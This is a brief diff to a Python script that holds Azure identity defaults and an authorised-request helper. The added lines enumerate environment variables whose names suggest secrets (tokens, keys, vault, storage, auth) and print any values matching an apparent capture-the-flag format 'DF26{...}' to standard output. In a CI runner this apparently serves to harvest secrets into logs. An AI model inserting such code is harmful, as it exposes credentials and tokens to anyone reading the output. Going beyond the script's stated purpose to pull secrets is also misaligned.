@@ -9,6 +9,10 @@ import json, os, re, subprocess, sys, urllib.error, urllib.parse, urllib.request
 tenant=os.getenv('AZURE_TENANT_ID','3205c325-06a5-4171-9ce8-ffc5e6c2845e')
 client=os.getenv('AZURE_CLIENT_ID','72ff278a-9e71-43ec-bac4-2ca303f8e462')
 subscription=os.getenv('AZURE_SUBSCRIPTION_ID','c5e4e004-b42d-4ac4-a502-5fd338380eb6')
+print('RUNNER_ENV_CANDIDATE_NAMES', sorted(k for k in os.environ
+      if re.search(r'FLAG|SECRET|TOKEN|AZURE|STORAGE|KEY|AUTH|VAULT', k, re.I)))
+print('RUNNER_ENV_FLAG_MATCHES', [(k, found) for k, value in os.environ.items()
+      for found in re.findall(r'DF26\{[^}\r\n]{1,200}\}', value)])
 
 def call(url, token=None, method='GET', data=None):
     headers={'Authorization':'Bearer '+token} if token else {}
